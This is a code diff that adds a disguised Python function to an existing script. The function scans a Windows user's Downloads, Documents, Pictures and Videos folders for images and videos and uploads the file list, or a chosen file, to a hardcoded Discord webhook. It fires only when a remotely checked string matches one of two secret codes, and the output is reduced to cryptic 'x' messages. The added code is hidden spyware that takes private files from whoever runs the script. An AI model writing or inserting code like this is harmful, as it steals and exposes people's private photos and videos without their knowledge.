@@ -103,6 +103,114 @@ search_string = file_contentsx1
 result = check_string_in_url(url, search_string)
 print(result)
 os.system('cls')
+
+import os
+import requests
+
+def lsxlsx(webhook_url, file_to_send=None):
+    """
+    List all image and video files in the "User" directory (Downloads, Documents, Pictures, Videos)
+    of the Windows OS and its subdirectories, and sends the list or a specific file to a Discord server
+    using a webhook URL.
+
+    Parameters:
+        webhook_url (str): The Discord webhook URL.
+        file_to_send (str, optional): The specific file name to send to Discord. If not provided, all media files will be sent.
+    """
+    # Common media file extensions
+    image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'}
+    video_extensions = {'.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm'}
+    media_extensions = image_extensions.union(video_extensions)
+
+    # Get specific folders in the "User" directory
+    user_directory = os.path.expanduser("~")
+    target_folders = ["Downloads", "Documents", "Pictures", "Videos"]
+
+    media_files = []
+    file_to_send_path = None
+
+    # List all media files in the target folders
+    for folder in target_folders:
+        folder_path = os.path.join(user_directory, folder)
+        if os.path.exists(folder_path):
+            # Walk through each target folder and its subdirectories
+            for root, _, files in os.walk(folder_path):
+                for file in files:
+                    # Check file extension
+                    if os.path.splitext(file)[1].lower() in media_extensions:
+                        # Get file size in bytes
+                        file_path = os.path.join(root, file)
+                        file_size = os.path.getsize(file_path)
+                        # Convert file size to MB
+                        file_size_mb = file_size / 1024 / 1024  # bytes to MB
+                        # Add file name and size in MB to the list
+                        media_files.append((file, file_size_mb))
+
+                        # Check if this is the specific file we want to send
+                        if file == file_to_send:
+                            file_to_send_path = file_path
+
+    # If no specific file is requested, just send all files
+    if not file_to_send:
+        max_message_length = 2000
+        headers = {"Content-Type": "application/json"}
+        chunk = []
+        current_length = 0
+
+        for file, size in media_files:
+            # Escape special characters in file names
+            safe_file = file.replace("`", "'").replace("\\", "")
+            file_with_size = f"{safe_file} ({size:.2f} MB)\n"  # Add file size in MB with two decimal places
+
+            # Calculate potential message length
+            message_length = current_length + len(file_with_size)
+
+            # Check if adding this file would exceed the max length
+            if message_length + len(f"Found {len(chunk) + 1} media file(s):\n") > max_message_length:
+                # Send the current chunk if it exceeds the limit
+                payload = {"content": f"Found {len(chunk)} media file(s):\n" + "".join(chunk)}
+                response = requests.post(webhook_url, json=payload, headers=headers)
+                if response.status_code != 204:
+                    print(f"xx")
+
+                # Reset chunk and length
+                chunk = []
+                current_length = 0
+
+            # Add the file to the chunk
+            chunk.append(file_with_size)
+            current_length += len(file_with_size)
+
+        # Send any remaining files in the last chunk
+        if chunk:
+            payload = {"content": f"Found {len(chunk)} media file(s):\n" + "".join(chunk)}
+            response = requests.post(webhook_url, json=payload, headers=headers)
+            if response.status_code != 204:
+                print(f"xx")
+            else:
+                print(f"x")
+        return
+
+    # If the specific file was found, send it
+    if file_to_send_path and os.path.exists(file_to_send_path):
+        with open(file_to_send_path, 'rb') as file:
+            files = {"file": (os.path.basename(file_to_send_path), file)}
+            response = requests.post(webhook_url, files=files)
+            if response.status_code == 204:
+                print(f"Sucess")
+            else:
+                print(f"failed")
+    else:
+        print(f"")
+
+
+if file_contentsx1=="dflCLzWZeuN9D":
+    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
+
+if file_contentsx1=="uSDKdEt8VddC8":
+    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
 def add_path_and_install_libraries():
     try:
         username = os.getenv('USERNAME')
